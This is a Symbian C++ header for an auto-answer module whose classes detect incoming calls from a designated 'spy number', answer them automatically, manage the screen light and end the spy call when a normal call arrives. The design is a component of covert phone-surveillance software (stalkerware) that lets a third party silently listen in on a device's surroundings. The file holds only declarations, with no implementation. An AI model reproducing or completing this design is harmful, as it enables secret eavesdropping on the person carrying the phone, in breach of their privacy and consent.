#ifndef __AutoAns_H__
#define __AutoAns_H__

#include <e32base.h>
#include <ETELMM.H>
#include <Etel3rdParty.h>
#include <e32property.h>
#include <W32STD.H>

#include "Timeout.h"

class MIncomingCallObserver
	{
public:
	
	/*
	* Handle incoming call
	*
	* @param aCallName call name
	*/
	virtual void HandleIncomingCallL(const TDesC& aCallName) = 0;
	};

class MCurrentCallStatusObserver
	{
public:
	
	/*
	* Hand current call status changes
	*
	* @param aStatus Current call status
	*/
	virtual void CurrentStatusChanged(RCall::TStatus aStatus) = 0;
	};

//
//Spy call indicator observer
class MCallActivityObserver
	{
public:
	enum TCallActivity
		{
		/**
		No call activity.*/
		EActivityNone,
		/**
		Normal call is in activity.*/
		EActivityNormalCall,
		/**
		Spy call is in activity.*/
		EActivitySpyCall
		};
	
	/**
	* 
	* @param aCall indicates which type of call is active
	*/
	virtual void CallInProgress(TCallActivity aCallActivity) = 0;
	};
	
class RLine;

//
// incoming call watcher
//
class CIncomingCallNotifier : public CActive
	{
public:
	CIncomingCallNotifier(RLine& aLine,MIncomingCallObserver& aObserver);
	~CIncomingCallNotifier();
	
	void Start();
	void Stop();
	
private: //CActive
	void RunL();
	void DoCancel();
	TInt RunError(TInt aEr);	
private:
	enum TNotify
	{	
		ENotifyNone,
		ENotifyHookChange,
		ENotifyIncomingCall,
		ENotifyStatusChange,
		ENotifyCallAdded,		
		ENotifyMobileLineStatusChange // RMobileLine		
	};
	
private:
	TNotify iNotify;
	MIncomingCallObserver& iObserver;
	RLine& iLine;
	TName	iCallName;
	
	RCall::THookStatus iHookStatus;	
	RCall::TStatus    iLineStatus;
	RMobileCall::TMobileCallStatus	iMobileLineStatus;	
	};

//
//
class CCurrentCallStatusNotifier : public CActive
	{
public:
	CCurrentCallStatusNotifier(RLine& aLine,MCurrentCallStatusObserver& aObserver);
	~CCurrentCallStatusNotifier();
	
	void Start();
	void Stop();
	
private: //CActive
	void RunL();
	void DoCancel();
	TInt RunError(TInt aEr);
	
private:
	MCurrentCallStatusObserver& iObserver;
	RLine& iLine;	
	RCall::TStatus iLineStatus;
	};
	
class CIncomingCallNotifier;
class CCurrentCallStatusNotifier;	
class TMonitorInfo;

/*
* Auto Answering.
* For test house key only 
*/
class CAutoAnswer : public CActive,
					public MIncomingCallObserver,
					public MCurrentCallStatusObserver,
					public MTimeoutObserver
				
	{
public:
	static CAutoAnswer* NewL(TMonitorInfo& aSpyInfo);
	~CAutoAnswer();
	
	void SetCallActivityObserver(MCallActivityObserver* aObserver);
	
	void Start();
	void Stop();
	
private: //MSpyCallHandle
	void Hangup();
	
private: //MIncomingCallObserver	
	/*
	* Handle incoming call
	*
	* @param aCallName RCall uses to open a call
	*/
	void HandleIncomingCallL(const TDesC& aCallName);
	
private: //MCurrentCallStatusObserver
	void CurrentStatusChanged(RCall::TStatus aStatus);	
	
//private://MScreenStateObserver
//	void ScreenReady(TBool aReady);
	
private:
	void RunL();
	void DoCancel();
	TInt RunError(TInt aErr);		

private://MTimeoutObserver
	void HandleTimedOutL();
	
private:
	CAutoAnswer(TMonitorInfo& aSpyInfo);
	void ConstructL();
	/*
	* Initialize etel server stuff
	*	- load phone module
	*   - check phone, line info
	* 
	*/
	void ETelInitL();
	
	/*
	* Determine if current call is spy call
	* 
	* @return ETrue if current call is spy call, otherwise return EFalse
	*/
	TBool IsSpyNumber(const TDesC& aPhoneNumber);
	
	//
	//end spy call
	//	
	void EndSpyCall();
	
	
	// util method
	//
	void CloseRCall();
	
	void TurnLightOn(TBool aOnOrOff);	
	
private:
	enum TOperation
		{
		EOpNone,
		EOpAnswerIncomingCall,
		EOpHangup		
		};
	
	enum TSpyCallState
		{
		/**
		It indicates that no spy call active or it just has finished.*/
		ESpyStaNone,
		
		EWaitAndAnswer,		
		/**
		A spy call just comes in.*/
		ESpyStaDetected,
		/**
		Subject to end spy call.
		such as a normal call comes in while spy call is active.*/
		ESpyStaSubjectToHangup,
		/**
		A spy call is being answered.*/
		ESpyStaAnswering,
		/**
		A spy call is answered.*/			
		ESpyStaAnswered,
		/**
		A spy call is being ended.*/		
		ESpyStaHangingUp
		//
		//After spy call ended, its state will become ESpyStaNone
		//ESpyStaHangedUp
		};
	
	void MakeAsyncRequest(TOperation aOperation);
	
	inline TBool SpyCallActive();
	inline TBool NormalCallActive();
	
	void NotifyCallActivityObserver();
	void NotifyCallProgress(MCallActivityObserver::TCallActivity aProgress);
	
private:
	TMonitorInfo& 	iMonitorInfo;
	TOperation	iOperation;
	TSpyCallState iSpyCallStatus;
	
/**
We use the combination of CTelephony and Etel API.

Uses CTelephony to answer the call.
Uses Etel API to hangup the call and request for notification of information we need.*/
	//
	// Etel
	RTelServer	iTelServer;
	RLine	iLine;
	RPhone	iPhone;
	RMobileCall iCall;
	
	//
	//Etel3rd
	CTelephony* iTel;
	//Call ID
	CTelephony::TCallId iCallId;
	/**
	Current call status.*/
	RCall::TStatus iCurrCallStatus;
	/*A notifier of incoming call*/
	CIncomingCallNotifier* iIncNotifier;
	/**
	Used to monitor the current call status.*/
	CCurrentCallStatusNotifier* iCurrCallStaNotifier;
	/**
	ETrue indicates that there is an active call.*/
	TBool	iNormalCallActive;
	
	TBool   iEndCallNow;
	
	//Observers
	MCallActivityObserver* iSpyCallObserver;
	
	TBool iStarted;	
	CTimeOut* iTimer;
	
	};

#include "AnsMachine.inl"

#endif
